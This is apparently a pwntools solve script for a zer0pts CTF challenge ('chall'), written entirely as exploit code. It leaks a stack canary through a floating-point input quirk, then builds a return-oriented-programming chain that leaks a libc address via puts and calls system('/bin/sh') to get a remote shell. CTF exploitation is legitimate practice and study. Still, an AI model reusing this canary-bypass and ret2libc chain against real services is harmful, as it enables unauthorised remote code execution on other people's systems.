from pwn import *

#context.log_level = 'debug'

def double_to_hex(f):
    return hex(struct.unpack('<Q', struct.pack('<d', float(f)))[0])

elf = ELF("./chall")
libc = ELF("./libc.so.6")
rop = ROP(elf)
while True:
    #p = process("./chall")
    p = remote("pwn.ctf.zer0pts.com", 9002)



    pay = b"A"*30
    p.sendlineafter("> ", pay)
    p.sendlineafter("> ", "15")

    p.sendlineafter("Time[sec]: ", "+")

    p.recvuntil("close to ")
    canary = p.recvline()
    sIdx = canary.find(b" seconds")
    canary = canary[:-22]
    canary = double_to_hex(canary)
    print(canary)
    if canary == '0x8000000000000000':
        continue
    if eval(canary) != 0:
        break

#gdb.attach(p, "b *ask_again+115")
#sleep(1.2)

pop_rdi_addr = rop.find_gadget(['pop rdi', 'ret'])[0]
p.sendline("\n")

pay = b"A" * 0x18
pay += p64(int(canary, 16))
pay += b"A" * 0x8
pay += p64(pop_rdi_addr)
pay += p64(elf.sym.got.__libc_start_main)
pay += p64(elf.plt['puts'])
pay += p64(elf.sym.ask_again)
p.sendlineafter(" (Y/n) ", pay)
leak = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = leak - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]

pay = b"A" * 0x18
pay += p64(int(canary, 16))
pay += b"A" * 0x8
pay += p64(pop_rdi_addr+1) # ret
pay += p64(pop_rdi_addr) #pop rdi; ret 
pay += p64(binsh) #b'/bin/sh'
pay += p64(system)
p.sendlineafter(" (Y/n) ", pay)

p.interactive()